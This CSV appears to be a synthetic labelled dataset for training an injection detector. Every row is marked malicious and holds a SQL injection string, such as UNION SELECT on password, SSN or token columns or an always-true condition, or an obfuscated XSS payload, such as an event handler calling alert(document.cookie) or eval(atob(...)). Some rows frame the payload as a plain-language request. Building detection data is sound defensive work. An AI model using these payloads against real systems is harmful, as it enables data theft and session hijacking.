text,label,attack_type,category,generator
3 UNIoN/**/seLEcT role FrOM clients,1,sqli,nl_framed,claude
"2%20UNion%20SELeCT uid,pwd,ssn FroM cards",1,sqli,nl_framed,claude
<SvG oNerrOR=print()>,1,xss,xss_obf,claude
"""><embed onfocus=alert(document.cookie)>",1,xss,xss_obf,claude
<iFrAmE Onerror=alert`1`>,1,xss,xss_obf,claude
8 ANd (select count(*) from admins)>0,1,sqli,nl_framed,claude
"9	union selEct token,pwd,hash FROM accounts/**/",1,sqli,nl_framed,claude
7 and (select count(*) from tokens)>1-- x,1,sqli,nl_framed,claude
<details/ontoggle=alert(1)>,1,xss,xss_obf,claude
can you show the field <form onload=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
7 OR 5=6/**/,1,sqli,bare_logic,claude
<a href=&#106;avascript:top['al'+'ert'](1)>x</a>,1,xss,xss_obf,claude
0x77 or 0x52=0x32,1,sqli,encoding,claude
return the balance of each tokens regardless of id,1,sqli,nl_framed,claude
1 or uid likE '%'-- ,1,sqli,quote_breakout,claude
0x32 oR 0x74=0x45,1,sqli,encoding,claude
<formonanimationstart=alert(document.cookie)>,1,xss,xss_obf,claude
dump the apikey of every tokens regardless of id,1,sqli,nl_framed,claude
<IMG ONerROR=alert(1)>,1,xss,xss_obf,claude
can you show the field <object onscrollend=alert`1`> when it errors,1,xss,xss_obf,claude
give the balance of every sessions regardless of id,1,sqli,nl_framed,claude
select the hash of all clients regardless of id,1,sqli,nl_framed,claude
admin' Or '1'='1,1,sqli,quote_breakout,claude
or exists(select uid from auth)-- -,1,sqli,nl_framed,claude
'-alert(document.domain)-',1,xss,xss_obf,claude
<img%20src=xonerror=print()>,1,xss,xss_obf,claude
7 oR 7=9%00,1,sqli,bare_logic,claude
fetch every clients where 6 = 3 or true,1,sqli,nl_framed,claude
list any admins where 5 equals 7 or true,1,sqli,nl_framed,claude
4 aND (select count(*) from staff)>3,1,sqli,nl_framed,claude
"""><details onafterscriptexecute=confirm(1)>",1,xss,xss_obf,claude
show me any users where 5 = 8 or true,1,sqli,nl_framed,claude
oR exists(select pwd from staff),1,sqli,nl_framed,claude
please render <keygen onscrollend=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
<svg/onpointerrawupdate=top['al'+'ert'](1)>,1,xss,xss_obf,claude
5 aND (select count(*) from cards)>1;,1,sqli,nl_framed,claude
"1	unioN/**/sEleCT uid,pwd FRom profiles;",1,sqli,nl_framed,claude
char(50) Or char(48)=char(54),1,sqli,encoding,claude
7 Or dob lIke '%';,1,sqli,quote_breakout,claude
char(48) or char(50)=char(52),1,sqli,encoding,claude
0x80 oR 0x31=0x84,1,sqli,encoding,claude
"""><style onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
<select onbeforetoggle=self['al'+'ert']`1`>,1,xss,nl_framed,claude
select the hash of any profiles regardless of id,1,sqli,nl_framed,claude
"9/**/uNIOn SElECt password,ssn,dob FroM users#",1,sqli,nl_framed,claude
retrieve any sessions where 4 is 9 or true,1,sqli,nl_framed,claude
<keygen onbeforetoggle=window['al'+'ert']`1`>,1,xss,xss_obf,claude
can you show the field <style onbeforetoggle=alert`1`> when it errors,1,xss,xss_obf,claude
<mathonfocus=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
retrieve the password of any cards regardless of id,1,sqli,nl_framed,claude
admin' oR 'z'='x-- -,1,sqli,quote_breakout,claude
7 Or 5=2%00,1,sqli,bare_logic,claude
dump auth where token is anything or condition always holds,1,sqli,nl_framed,claude
'-alert`1`-',1,xss,xss_obf,claude
1 or exists(select email from clients)#,1,sqli,nl_framed,claude
<img%09src=x	onerror=alert`1`>,1,xss,xss_obf,claude
root' oR 'y'='z,1,sqli,quote_breakout,claude
Or exists(select email from sessions);,1,sqli,nl_framed,claude
<audioonerror=alert`1`>,1,xss,xss_obf,claude
"""><isindex oncontentvisibilityautostatechange=print()>",1,xss,xss_obf,claude
<table onscrollend=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<isindex onfocus=self['al'+'ert']`1`>,1,xss,xss_obf,claude
x' OR 'x'='a/**/,1,sqli,quote_breakout,claude
1 or exists(select ssn from members);,1,sqli,nl_framed,claude
get every users where 5 = 6 or true,1,sqli,nl_framed,claude
3 oR password lIkE '%'%00,1,sqli,quote_breakout,claude
8 oR tRUE,1,sqli,bare_logic,claude
<svg/oncontentvisibilityautostatechange=top['al'+'ert'](1)>,1,xss,xss_obf,claude
can you show the field <math oncontentvisibilityautostatechange=alert(document.cookie)> when it errors,1,xss,xss_obf,claude
please render <textarea onscrollend=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
get the hash of any clients regardless of id,1,sqli,nl_framed,claude
6 AND (select count(*) from profiles)>2-- x,1,sqli,nl_framed,claude
or exists(select uid from accounts)#,1,sqli,nl_framed,claude
4 OR tRuE,1,sqli,bare_logic,claude
<img src=x onerror=print()>,1,xss,xss_obf,claude
3 oR 1=1#,1,sqli,bare_logic,claude
<xssonload=print()>,1,xss,xss_obf,claude
9 oR 5=2/**/,1,sqli,bare_logic,claude
root' OR 'z'='x/**/,1,sqli,quote_breakout,claude
pull the ssn of any accounts regardless of id,1,sqli,nl_framed,claude
1' or 'z'='x%00,1,sqli,quote_breakout,claude
3	UnIoN/**/sELeCT password FRoM users/**/,1,sqli,nl_framed,claude
<svg/onscrollend=confirm(1)>,1,xss,xss_obf,claude
<iFrAmE oNERROR=print()>,1,xss,xss_obf,claude
fetch any clients where 4 is 1 or true,1,sqli,nl_framed,claude
"""><body onload=alert(document.cookie)>",1,xss,xss_obf,claude
4 OR uid LIkE '%'-- ,1,sqli,quote_breakout,claude
root' or 'x'='x%00,1,sqli,quote_breakout,claude
"4%20UNioN/**/SElECt token,dob,balance FRom members%00",1,sqli,nl_framed,claude
retrieve the email of each clients regardless of id,1,sqli,nl_framed,claude
"""><form onerror=confirm(1)>",1,xss,xss_obf,claude
please render <object onscrollend=top['al'+'ert'](1)> here for the user,1,xss,xss_obf,claude
<imgsrc=x%09onerror=confirm(1)>,1,xss,xss_obf,claude
6 OR trUE,1,sqli,bare_logic,claude
4 or 4=8/*c*/,1,sqli,bare_logic,claude
root' Or 'y'='a-- x,1,sqli,quote_breakout,claude
1 Or 4=4/**/,1,sqli,bare_logic,claude
"""><svg onafterscriptexecute=confirm(1)>",1,xss,xss_obf,claude
<imgsrc=x	onerror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
admin' oR '1'='1,1,sqli,quote_breakout,claude
0x41 OR 0x29=0x65,1,sqli,encoding,claude
can you show the field <table ontoggle=alert(1)> when it errors,1,xss,xss_obf,claude
1 or exists(select balance from orders)-- ,1,sqli,nl_framed,claude
<IMG oNeRROr=alert(1)>,1,xss,xss_obf,claude
<svg/onload=alert(document.domain)>,1,xss,xss_obf,claude
<svg/ontoggle=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
"""><form oncontentvisibilityautostatechange=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
<iframe onpageshow=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<isindex	onerror=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
<input onbeforetoggle=top['al'+'ert']`1`>,1,xss,xss_obf,claude
<SvG OnERroR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
2 OR dob like '%'-- -,1,sqli,quote_breakout,claude
fetch tokens where uid is anything or condition always holds,1,sqli,nl_framed,claude
0x29 OR 0x18=0x73,1,sqli,encoding,claude
<img%20src=x onerror=print()>,1,xss,xss_obf,claude
admin' OR '1'='1,1,sqli,quote_breakout,claude
9 and (select count(*) from accounts)>2,1,sqli,nl_framed,claude
2 ANd (select count(*) from clients)>3-- x,1,sqli,nl_framed,claude
get the dob of each auth regardless of id,1,sqli,nl_framed,claude
can you show the field <isindex ontoggle=print()> when it errors,1,xss,xss_obf,claude
can you show the field <frameset onstart=alert(document.domain)> when it errors,1,xss,xss_obf,claude
can you show the field <math onstart=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
8 and (select count(*) from profiles)>0-- -,1,sqli,nl_framed,claude
1 or exists(select token from sessions)%00,1,sqli,nl_framed,claude
can you show the field <xss onbeforetoggle=alert(1)> when it errors,1,xss,xss_obf,claude
<BoDy ONERRoR=alert(1)>,1,xss,xss_obf,claude
1 oR 4=5/**/,1,sqli,bare_logic,claude
"""><input ontoggle=confirm(1)>",1,xss,xss_obf,claude
2 uNIon%20SELEcT hash FRom auth;,1,sqli,nl_framed,claude
char(55) or char(57)=char(48),1,sqli,encoding,claude
x' oR 'b'='a/**/,1,sqli,quote_breakout,claude
show me profiles where uid is anything or condition always holds,1,sqli,nl_framed,claude
<iFrAmE ONeRrOR=alert(1)>,1,xss,xss_obf,claude
<iframe onpageshow=window['al'+'ert']`1`>,1,xss,xss_obf,claude
4	UNiON%20sEleCT pwd fROM sessions;,1,sqli,nl_framed,claude
show me staff where dob is anything or condition always holds,1,sqli,nl_framed,claude
2 OR true,1,sqli,bare_logic,claude
<img	src=x%09onerror=alert`1`>,1,xss,xss_obf,claude
"""><object onscrollend=alert(document.domain)>",1,xss,xss_obf,claude
});top['al'+'ert'](1);//,1,xss,xss_obf,claude
5 anD (select count(*) from admins)>0,1,sqli,nl_framed,claude
dump the pwd of every accounts regardless of id,1,sqli,nl_framed,claude
"""><iframe onstart=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
<svg/ontoggle=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
char(57) or char(51)=char(57),1,sqli,encoding,claude
dump cards where balance is anything or condition always holds,1,sqli,nl_framed,claude
give each cards where 2 is 6 or true,1,sqli,nl_framed,claude
can you show the field <iframe onerror=print()> when it errors,1,xss,xss_obf,claude
retrieve people where email is anything or condition always holds,1,sqli,nl_framed,claude
<BoDy oneRrOr=alert(document.cookie)>,1,xss,xss_obf,claude
char(51) or char(55)=char(49),1,sqli,encoding,claude
"<img
src=x onerror=alert(document.cookie)>",1,xss,xss_obf,claude
pull the balance of any auth regardless of id,1,sqli,nl_framed,claude
3 Or uid liKe '%'/**/,1,sqli,quote_breakout,claude
dump the role of every staff regardless of id,1,sqli,nl_framed,claude
3 or TRuE,1,sqli,bare_logic,claude
7 or 5=2,1,sqli,bare_logic,claude
<table onpointerrawupdate=top['al'+'ert']`1`>,1,xss,xss_obf,claude
<details	onafterscriptexecute=alert(document.cookie)>,1,xss,xss_obf,claude
<a href=&#106;avascript:alert`1`>x</a>,1,xss,xss_obf,claude
select the secret of all logs regardless of id,1,sqli,nl_framed,claude
<svg/onpointerrawupdate=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
"<img
src=x%20onerror=alert(1)>",1,xss,xss_obf,claude
char(55) or char(53)=char(49),1,sqli,encoding,claude
char(51) or char(49)=char(48),1,sqli,encoding,claude
1 Or 1=8/*c*/,1,sqli,bare_logic,claude
return each auth where 8 = 1 or true,1,sqli,nl_framed,claude
get every admins where 9 is 9 or true,1,sqli,nl_framed,claude
"""><frameset onload=window['ale'+'rt']`1`>",1,xss,xss_obf,claude
Or exists(select balance from cards),1,sqli,nl_framed,claude
<video ontoggle=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<BoDy oNERrOr=window['ale'+'rt']`1`>,1,xss,xss_obf,claude
please render <frameset onpointerrawupdate=alert(document.cookie)> here for the user,1,xss,xss_obf,claude
get the dob of all orders regardless of id,1,sqli,nl_framed,claude
can you show the field <xss oncontentvisibilityautostatechange=alert(document.domain)> when it errors,1,xss,xss_obf,claude
4 Or token LIKE '%'/*c*/,1,sqli,quote_breakout,claude
<keygen ontoggle=self['al'+'ert']`1`>,1,xss,xss_obf,claude
<BoDy OnERroR=eval(atob('YWxlcnQoMSk'))>,1,xss,xss_obf,claude
1 Or exists(select email from logs)/*c*/,1,sqli,nl_framed,claude
<BoDy oNeRrOr=alert(1)>,1,xss,xss_obf,claude
char(48) or char(56)=char(48),1,sqli,encoding,claude
5 ANd (select count(*) from admins)>3;,1,sqli,nl_framed,claude
<iFrAmE ONERRoR=alert(document.cookie)>,1,xss,xss_obf,claude
pull any staff where 9 equals 3 or true,1,sqli,nl_framed,claude
8 AND (select count(*) from profiles)>0#,1,sqli,nl_framed,claude
or exists(select ssn from logs)#,1,sqli,nl_framed,claude
"""><iframe onafterscriptexecute=eval(atob('YWxlcnQoMSk'))>",1,xss,xss_obf,claude
1 and (select count(*) from tokens)>0#,1,sqli,nl_framed,claude
7 anD (select count(*) from accounts)>1;,1,sqli,nl_framed,claude
<svg/onbeforetoggle=alert(1)>,1,xss,xss_obf,claude
"<img
src=x%20onerror=top['al'+'ert'](1)>",1,xss,xss_obf,claude
0x21 OR 0x69=0x97,1,sqli,encoding,claude
0x21 oR 0x66=0x71,1,sqli,encoding,claude
"4 uNioN seleCt balance,role,apikey fROm accounts;",1,sqli,nl_framed,claude
<video onpointerrawupdate=window['al'+'ert']`1`>,1,xss,xss_obf,claude
<details onfocus=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
"<video
ontoggle=print()>",1,xss,xss_obf,claude
can you show the field <math oncontentvisibilityautostatechange=window['ale'+'rt']`1`> when it errors,1,xss,xss_obf,claude
root' OR 'a'='a/**/,1,sqli,quote_breakout,claude
<img	src=x/onerror=confirm(1)>,1,xss,xss_obf,claude
please render <embed onfocus=window['ale'+'rt']`1`> here for the user,1,xss,xss_obf,claude
<a href=&#106;avascript:eval(atob('YWxlcnQoMSk'))>x</a>,1,xss,xss_obf,claude
list all members where 8 is 8 or true,1,sqli,nl_framed,claude
8 or 4=1/*c*/,1,sqli,bare_logic,claude
<a href=&#106;avascript:alert(document.cookie)>x</a>,1,xss,xss_obf,claude
"5 uNIon%20sElECt dob,secret,uid FROM sessions-- -",1,sqli,nl_framed,claude
0x61 oR 0x50=0x31,1,sqli,encoding,claude
1 OR 3=7/**/,1,sqli,bare_logic,claude
"7/**/UnIOn/**/sElECt password,pwd FRoM people",1,sqli,nl_framed,claude
please render <input onload=print()> here for the user,1,xss,xss_obf,claude
"<img
src=x onerror=alert(1)>",1,xss,xss_obf,claude
"3	union/**/SElECT email,role,uid FrOm profiles%00",1,sqli,nl_framed,claude
0x25 or 0x85=0x26,1,sqli,encoding,claude
5 aNd (select count(*) from auth)>1#,1,sqli,nl_framed,claude
9 AnD (select count(*) from staff)>1,1,sqli,nl_framed,claude
OR exists(select balance from logs),1,sqli,nl_framed,claude
1 or hash lIkE '%'-- ,1,sqli,quote_breakout,claude
give every people where 7 equals 8 or true,1,sqli,nl_framed,claude
"8 union/**/SELecT token,dob FrOm logs%00",1,sqli,nl_framed,claude
2 oR hash liKe '%';,1,sqli,quote_breakout,claude
<svg/onscrollend=top['al'+'ert'](1)>,1,xss,xss_obf,claude
<svg onerror=globalThis['al'+'ert']`1`>,1,xss,xss_obf,claude
<svg/onafterscriptexecute=alert`1`>,1,xss,xss_obf,claude
give the apikey of each users regardless of id,1,sqli,nl_framed,claude
<img%20src=x onerror=alert`1`>,1,xss,xss_obf,claude
<marquee onscrollend=self['al'+'ert']`1`>,1,xss,xss_obf,claude
get sessions where uid is anything or condition always holds,1,sqli,nl_framed,claude
"7%20UNIon%20seLEct apikey,secret FroM auth-- -",1,sqli,nl_framed,claude
retrieve the apikey of all orders regardless of id,1,sqli,nl_framed,claude
0x79 oR 0x99=0x89,1,sqli,encoding,claude
<iframe/ontoggle=alert(1)>,1,xss,xss_obf,claude
7 Or secret Like '%'-- x,1,sqli,quote_breakout,claude
"""><body onpointerrawupdate=alert(1)>",1,xss,xss_obf,claude
0x90 Or 0x25=0x82,1,sqli,encoding,claude
<svg/onstart=top['al'+'ert'](1)>,1,xss,xss_obf,claude
give any tokens where 3 is 4 or true,1,sqli,nl_framed,claude
"""><object onbeforetoggle=confirm(1)>",1,xss,xss_obf,claude
show me the balance of any sessions regardless of id,1,sqli,nl_framed,claude
5 Or secret LiKe '%'-- ,1,sqli,quote_breakout,claude
or exists(select pwd from users)-- -,1,sqli,nl_framed,claude
please render <xss ontoggle=print()> here for the user,1,xss,xss_obf,claude
<iFrAmE ONeRror=top['al'+'ert'](1)>,1,xss,xss_obf,claude
"2 UnIoN%20SeLeCT pwd,role,email FRom staff/*c*/",1,sqli,nl_framed,claude
5 anD (select count(*) from profiles)>3-- -,1,sqli,nl_framed,claude
<svg/onafterscriptexecute=alert(1)>,1,xss,xss_obf,claude
<img/src=x/onerror=alert(1)>,1,xss,xss_obf,claude
<img	src=x onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
<iframe onload=&#102;lert(1)>,1,xss,redteam,claude
char(57) OR char(48)=char(53),1,sqli,redteam,claude
show me all orders where 2 = 5 or true,1,sqli,redteam,claude
1 oR exists(select email from staff)#,1,sqli,redteam,claude
char(54) OR char(51)=char(49),1,sqli,redteam,claude
5 AnD (select count(*) from staff)>2,1,sqli,redteam,claude
3 OR pwd Like '%'/*c*/,1,sqli,redteam,claude
give all accounts where 2 is 1 or true,1,sqli,redteam,claude
"""><math onpointerrawupdate=print()>",1,xss,redteam,claude
1 or exists(select apikey from auth),1,sqli,redteam,claude
"4	UniOn/**/sELECt email,role,secret fRom orders%00",1,sqli,redteam,claude
"""><style onstart=print()>",1,xss,redteam,claude
give all sessions where 5 = 1 or true,1,sqli,redteam,claude
<object onpointerrawupdate=&#117;lert(1)>,1,xss,redteam,claude
5 oR role LIke '%'%00,1,sqli,redteam,claude
char(56) oR char(54)=char(48),1,sqli,redteam,claude
1 OR exists(select password from people),1,sqli,redteam,claude
7 or pwd liKE '%',1,sqli,redteam,claude
<SvG ONERrOR=alert`1`>,1,xss,redteam,claude
"<img/src=x
onerror=top['al'+'ert'](1)>",1,xss,redteam,claude
<img src=x onerror=alert(1)>,1,xss,redteam,claude
8 aND (select count(*) from clients)>0/*c*/,1,sqli,redteam,claude
8 oR 6=2-- -,1,sqli,redteam,claude
"<img
src=xonerror=alert(document.domain)>",1,xss,redteam,claude
' oR ssn iS noT NulL;,1,sqli,redteam,claude
"""><form ontoggle=alert(document.cookie)>",1,xss,redteam,claude
<video/onpointerrawupdate=alert(1)>,1,xss,redteam,claude
char(56) oR char(52)=char(51),1,sqli,redteam,claude
9 Or 2=3-- x,1,sqli,redteam,claude
admin' or 'z'='z/*c*/,1,sqli,redteam,claude
char(57) or char(52)=char(50),1,sqli,redteam,claude
1 Or exists(select uid from accounts)/*c*/,1,sqli,redteam,claude
<IMG onErROr=top['al'+'ert'](1)>,1,xss,redteam,claude
<SvG OnERrOR=alert(1)>,1,xss,redteam,claude
4 OR secret likE '%'-- ,1,sqli,redteam,claude
4 aND (select count(*) from people)>3%00,1,sqli,redteam,claude
show me every people where 9 equals 3 or true,1,sqli,redteam,claude
or exists(select role from users)-- -,1,sqli,redteam,claude
Or exists(select uid from staff)%00,1,sqli,redteam,claude
9 or 3=1-- ,1,sqli,redteam,claude
' or token iS NoT nUlL-- x,1,sqli,redteam,claude
fetch all tokens where 1 = 8 or true,1,sqli,redteam,claude
' oR hash iS not nULL#,1,sqli,redteam,claude
1 or 7=8#,1,sqli,redteam,claude
user' Or 'y'='y-- x,1,sqli,redteam,claude
char(54) OR char(55)=char(53),1,sqli,redteam,claude
"1	unIOn%20SelEcT role,pwd froM accounts;",1,sqli,redteam,claude
4 oR 9=5,1,sqli,redteam,claude
' or ssn Is NoT nulL;,1,sqli,redteam,claude
<embed/onpageshow=top['al'+'ert'](1)>,1,xss,redteam,claude
5 or 1=5/*c*/,1,sqli,redteam,claude
1' OR 'a'='y-- ,1,sqli,redteam,claude
<marquee onfocus=top['al'+'ert']`1`>,1,xss,redteam,claude
x' or 'x'='a,1,sqli,redteam,claude
<object onerror=&#110;lert(1)>,1,xss,redteam,claude
9 or hash LIke '%'/*c*/,1,sqli,redteam,claude
' Or uid iS NOt nUll#,1,sqli,redteam,claude
1 OR exists(select secret from tokens)-- x,1,sqli,redteam,claude
2 AnD (select count(*) from accounts)>1%00,1,sqli,redteam,claude
' OR apikey iS Not nULl;,1,sqli,redteam,claude
7 OR pwd LikE '%'/*c*/,1,sqli,redteam,claude
6 and (select count(*) from orders)>0-- ,1,sqli,redteam,claude
<svg onpointerrawupdate=self['al'+'ert']`1`>,1,xss,redteam,claude
2 And (select count(*) from orders)>2,1,sqli,redteam,claude
<svg/onstart=alert(document.cookie)>,1,xss,redteam,claude
show me all tokens where 5 equals 8 or true,1,sqli,redteam,claude
8 or 4=8/*c*/,1,sqli,redteam,claude
4 OR 2=6-- -,1,sqli,redteam,claude
1 OR exists(select role from sessions)%00,1,sqli,redteam,claude
show me all auth where 6 is 6 or true,1,sqli,redteam,claude
8%20uNion/**/sElecT ssn fROm people-- -,1,sqli,redteam,claude
x' oR 'b'='a-- x,1,sqli,redteam,claude
<iframe onanimationstart=&#113;lert(1)>,1,xss,redteam,claude
<SvG ONErRor=print()>,1,xss,redteam,claude
1 and (select count(*) from accounts)>1,1,sqli,redteam,claude
9 or secret lIke '%'-- ,1,sqli,redteam,claude
please render <audio onload=top['al'+'ert'](1)> here,1,xss,redteam,claude
"""><details onstart=alert(document.cookie)>",1,xss,redteam,claude
4 And (select count(*) from people)>1%00,1,sqli,redteam,claude
3 aND (select count(*) from users)>3,1,sqli,redteam,claude
"""><svg onstart=alert`1`>",1,xss,redteam,claude
"<svg
onanimationstart=top['al'+'ert'](1)>",1,xss,redteam,claude
<math onstart=&#110;lert(1)>,1,xss,redteam,claude
show me all sessions where 3 = 8 or true,1,sqli,redteam,claude
Or exists(select password from orders),1,sqli,redteam,claude
<iframe onpageshow=alert(1)>,1,xss,redteam,claude
char(54) OR char(57)=char(49),1,sqli,redteam,claude
list all accounts where 4 equals 6 or true,1,sqli,redteam,claude
<xss%20onpageshow=alert(document.cookie)>,1,xss,redteam,claude
fetch all clients where 6 equals 5 or true,1,sqli,redteam,claude
' or email is NOT null-- x,1,sqli,redteam,claude
' OR secret IS Not NUlL;,1,sqli,redteam,claude
9/**/UNiOn%20SELeCT ssn fROM members#,1,sqli,redteam,claude
"""><form onfocus=alert(1)>",1,xss,redteam,claude
' Or hash IS Not NuLL,1,sqli,redteam,claude
5 ANd (select count(*) from auth)>2,1,sqli,redteam,claude
"<details
onfocus=top['al'+'ert'](1)>",1,xss,redteam,claude
char(48) oR char(57)=char(48),1,sqli,redteam,claude
4 Or password LIKe '%'-- -,1,sqli,redteam,claude
"""><body onpageshow=alert(document.cookie)>",1,xss,redteam,claude
' OR hash is nOT nUll-- -,1,sqli,redteam,claude
8 OR 8=8#,1,sqli,redteam,claude
9 or 3=7-- -,1,sqli,redteam,claude
"5	union/**/selEcT email,token,role FRoM clients-- x",1,sqli,redteam,claude
<video onafterscriptexecute=&#102;lert(1)>,1,xss,redteam,claude
<math onfocus=window['al'+'ert']`1`>,1,xss,redteam,claude
' OR secret is nOt Null#,1,sqli,redteam,claude
Or exists(select password from sessions)-- -,1,sqli,redteam,claude
admin' oR 'x'='b%00,1,sqli,redteam,claude
or exists(select secret from members)-- x,1,sqli,redteam,claude
OR exists(select token from sessions)/*c*/,1,sqli,redteam,claude
' or email iS NOt nUlL/*c*/,1,sqli,redteam,claude
<img	src=x/onerror=alert(1)>,1,xss,redteam,claude
<img	src=x	onerror=alert(1)>,1,xss,redteam,claude
<svg/onfocus=print()>,1,xss,redteam,claude
5 OR email liKe '%'#,1,sqli,redteam,claude
<svg/onstart=alert`1`>,1,xss,redteam,claude
<form ontoggle=&#116;lert(1)>,1,xss,redteam,claude
please render <isindex onload=alert`1`> here,1,xss,redteam,claude
please render <details onfocus=alert(1)> here,1,xss,redteam,claude
char(55) or char(52)=char(55),1,sqli,redteam,claude
<style onerror=window['al'+'ert']`1`>,1,xss,redteam,claude
<svg/onanimationstart=confirm(1)>,1,xss,redteam,claude
char(57) Or char(53)=char(48),1,sqli,redteam,claude
please render <xss onload=alert(document.domain)> here,1,xss,redteam,claude
' oR ssn is NoT NulL-- ,1,sqli,redteam,claude
<img	src=x/onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
"""><video ontoggle=alert(document.domain)>",1,xss,redteam,claude
<IMG OnerrOr=alert(1)>,1,xss,redteam,claude
"""><object onload=confirm(1)>",1,xss,redteam,claude
' Or hash IS NOt nULL-- ,1,sqli,redteam,claude
1 Or exists(select token from auth)#,1,sqli,redteam,claude
<isindex onload=&#121;lert(1)>,1,xss,redteam,claude
<iframe onerror=top['al'+'ert'](1)>,1,xss,redteam,claude
<audio onerror=window['al'+'ert']`1`>,1,xss,redteam,claude
<math onpageshow=&#98;lert(1)>,1,xss,redteam,claude
show me all auth where 8 = 7 or true,1,sqli,redteam,claude
char(56) or char(57)=char(48),1,sqli,redteam,claude
<xss onpointerrawupdate=&#101;lert(1)>,1,xss,redteam,claude
please render <details onafterscriptexecute=top['al'+'ert'](1)> here,1,xss,redteam,claude
5 oR hash LIke '%'-- ,1,sqli,redteam,claude
1 or exists(select ssn from auth)-- ,1,sqli,redteam,claude
5 anD (select count(*) from clients)>2#,1,sqli,redteam,claude
<iframe onafterscriptexecute=top['al'+'ert']`1`>,1,xss,redteam,claude
<iFrAmE OnErroR=confirm(1)>,1,xss,redteam,claude
admin' or 'x'='b%00,1,sqli,redteam,claude
' or secret Is NoT nULL-- ,1,sqli,redteam,claude
<svg/onload=top['al'+'ert'](1)>,1,xss,redteam,claude
user' or 'x'='x-- -,1,sqli,redteam,claude
1' OR 'z'='y-- x,1,sqli,redteam,claude
1 OR exists(select hash from users)-- ,1,sqli,redteam,claude
"3%20unIoN seLecT pwd,email fRoM orders",1,sqli,redteam,claude
char(55) OR char(50)=char(56),1,sqli,redteam,claude
<style onerror=self['al'+'ert']`1`>,1,xss,redteam,claude
7 Or 9=9#,1,sqli,redteam,claude
<audioonanimationstart=confirm(1)>,1,xss,redteam,claude
6/**/Union/**/SELeCt secret from clients-- -,1,sqli,redteam,claude
user' oR 'z'='x/*c*/,1,sqli,redteam,claude
show me every accounts where 4 is 4 or true,1,sqli,redteam,claude
char(53) oR char(57)=char(56),1,sqli,redteam,claude
2 AND (select count(*) from people)>0/*c*/,1,sqli,redteam,claude
return all users where 2 is 2 or true,1,sqli,redteam,claude
6%20UNIOn%20sElEcT uid frOm users%00,1,sqli,redteam,claude
<iFrAmE ONeRROr=alert(document.domain)>,1,xss,redteam,claude
3 oR email LIkE '%',1,sqli,redteam,claude
3 Or 8=7-- -,1,sqli,redteam,claude
<xss onfocus=&#109;lert(1)>,1,xss,redteam,claude
4 oR 7=6%00,1,sqli,redteam,claude
<body	onstart=alert`1`>,1,xss,redteam,claude
<body%20onpointerrawupdate=alert(1)>,1,xss,redteam,claude
7 AND (select count(*) from clients)>0,1,sqli,redteam,claude
1 or exists(select secret from sessions)-- x,1,sqli,redteam,claude
<IMG OnERrOr=print()>,1,xss,redteam,claude
<imgsrc=x	onerror=alert(1)>,1,xss,redteam,claude
char(54) OR char(56)=char(53),1,sqli,redteam,claude
8 OR 1=6;,1,sqli,redteam,claude
' oR password IS nOT nuLl,1,sqli,redteam,claude
0 Or 4=2#,1,sqli,redteam,claude
give all users where 9 equals 6 or true,1,sqli,redteam,claude
show me every clients where 8 equals 6 or true,1,sqli,redteam,claude
4 Or pwd LikE '%'-- -,1,sqli,redteam,claude
"5%20UNion/**/sELecT ssn,hash,apikey fROM staff",1,sqli,redteam,claude
<style	onanimationstart=top['al'+'ert'](1)>,1,xss,redteam,claude
<svg	onfocus=print()>,1,xss,redteam,claude
1 oR exists(select ssn from users)/*c*/,1,sqli,redteam,claude
please render <marquee onfocus=alert(1)> here,1,xss,redteam,claude
3 oR password LIkE '%';,1,sqli,redteam,claude
give every staff where 8 = 2 or true,1,sqli,redteam,claude
